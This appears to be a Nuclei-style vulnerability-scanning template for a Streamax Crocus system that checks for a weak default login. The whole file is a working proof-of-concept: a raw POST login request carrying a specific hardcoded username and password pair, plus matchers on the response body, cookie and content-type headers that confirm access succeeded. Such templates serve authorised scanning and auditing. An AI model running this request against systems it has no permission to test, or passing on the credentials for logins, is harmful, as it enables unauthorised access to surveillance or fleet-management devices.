id: poc-yaml-crocus-weak-password
info:
  name: 锐明技术 Crocus系统 弱口令漏洞
  author: ProjectDiscoveryAI
  severity: medium
  tags: weak-password
http:
  - raw:
      - |
        POST /RegisterLogin.do?Action=Login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        UserName=streamax20020818&Password=20020818streamax&MailCode=&AuthCode=
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"Result":true'
          - 'ReviceAccount'
      - type: word
        part: header
        words:
          - 'Saffron.U='
      - type: word
        part: header
        words:
          - 'text/json;charset=UTF-8'
